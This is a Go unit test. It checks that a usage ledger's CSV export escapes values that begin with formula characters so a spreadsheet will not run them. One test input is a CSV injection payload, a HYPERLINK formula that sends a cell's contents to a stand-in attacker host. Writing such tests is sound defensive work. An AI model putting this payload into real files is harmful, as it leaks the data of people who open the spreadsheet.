package serverusage

import (
	"bytes"
	"encoding/csv"
	"testing"
	"time"
)

// go-server-1021-4: a chat:invoke client's rejected model name reaches the
// ledger; the CSV export must not hand it to a spreadsheet as a formula.
func TestWriteEntriesCSVNeutralisesFormulaCells(t *testing.T) {
	formula := `=hyperlink("https://attacker.invalid/?"&a1,"open")`
	var buf bytes.Buffer
	if err := WriteEntriesCSV(&buf, []Entry{{
		Timestamp:        time.Date(2026, 10, 21, 10, 0, 0, 0, time.UTC),
		RequestID:        "@cmd",
		TokenDescription: "+1+1",
		RequestedMode:    "-2+3",
		RequestedModel:   formula,
		ActualProvider:   "\t=1",
		Status:           400,
		DurationMS:       12,
		CostUSD:          0.25,
	}}); err != nil {
		t.Fatal(err)
	}
	records, err := csv.NewReader(&buf).ReadAll()
	if err != nil || len(records) != 2 {
		t.Fatalf("records = %q, err = %v", records, err)
	}
	cell := make(map[string]string)
	for i, name := range records[0] {
		cell[name] = records[1][i]
	}
	for name, want := range map[string]string{
		"request_id":        "'@cmd",
		"token_description": "'+1+1",
		"requested_mode":    "'-2+3",
		"requested_model":   "'" + formula,
		"actual_provider":   "'\t=1",
		"status":            "400",
		"duration_ms":       "12",
		"cost_usd":          "0.250000",
	} {
		if cell[name] != want {
			t.Errorf("%s = %q, want %q", name, cell[name], want)
		}
	}
}
